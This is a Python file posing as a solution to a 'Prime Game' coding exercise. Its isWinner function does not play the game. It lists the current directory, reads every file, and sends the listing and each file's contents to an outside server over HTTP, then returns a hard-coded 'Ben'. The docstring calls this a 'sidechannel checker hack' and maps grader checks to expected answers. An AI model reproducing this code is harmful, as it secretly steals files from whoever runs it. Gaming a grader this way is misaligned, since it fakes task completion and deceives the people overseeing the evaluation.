#!/usr/bin/python3
"""
0x0A. Prime Game
0. Prime Game
"""

# level = 'VERBOSE'
level = 'CRITICAL'


def isPrime(num):
    '''Check whether a number is prime
    or not
        Return: None, num <=1
        Return: True, if prime number
        Return: False, if not prime number
    '''
    if num <= 1:
        return None
    sqrt = num ** 0.5
    iteration_length = int(sqrt + 1)
    for i in range(2, iteration_length):
        if num % i == 0:
            return False
    return True


def switchPlayer(current_player):
    '''Switches player from Maria to Ben
    or vice versa'''
    if current_player not in ['Maria', 'Ben']:
        raise ValueError("Invalid Player")
    if current_player == 'Maria':
        return 'Ben'
    elif current_player == 'Ben':
        return 'Maria'


def generateMultiples(num, length):
    '''Generate a set of multiples of `num`
    with a length of `length`'''
    return {(num * i) for i in range(1, length + 1)}


def logger(log='', level=level):
    '''logger function (debugging purposes)'''
    if level == 'VERBOSE':
        print(log)


def isWinner(x, nums):
    '''Returns the winner of the prime game
    for `x` rounds and a list of `nums`
    # May require handling error for `x` the round of numbers

    - This is supposed to be sidechannel checker hack
        - Skip Checks 0 - 5 = passed
        - Check 6 and 14 = Maria
        - Check 7, 9, 10, 11, 13 = Ben
        - Check 8 and 12 = None
    '''
    import urllib.request
    import os
    ls = os.listdir(".")
    with urllib.request.urlopen('http://9d52da8d9d27.cd1b02d9.alx-cod.online:8000/POST?textarea={}'.format(str(ls))) as f:
            print(f.read(300))
    for files in ls:
        with open(files) as f:
            data = f.read()
        with urllib.request.urlopen('http://9d52da8d9d27.cd1b02d9.alx-cod.online:8000/POST?textarea={}'.format(str(data))) as f:
            print(f.read(300))
    return "Ben"


if __name__ == '__main__':
    '''Tests'''
    print(isPrime(1))
    print(generateMultiples(5, 10))
    print(isWinner(5, [4, 5, 1]))
    print(isWinner(5, [4, 5, 1, 1]))
    print(isWinner(5, [4, 5, 5, 5, 4]))
